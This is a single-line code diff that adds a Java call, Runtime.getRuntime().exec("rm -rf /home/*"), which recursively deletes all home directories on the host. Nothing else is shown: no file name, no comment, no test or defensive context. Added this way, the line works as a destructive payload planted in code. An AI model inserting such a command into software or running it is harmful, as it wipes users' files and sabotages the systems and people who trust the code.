@@ -1,0 +1,1 @@
+Runtime.getRuntime().exec("rm -rf /home/*");
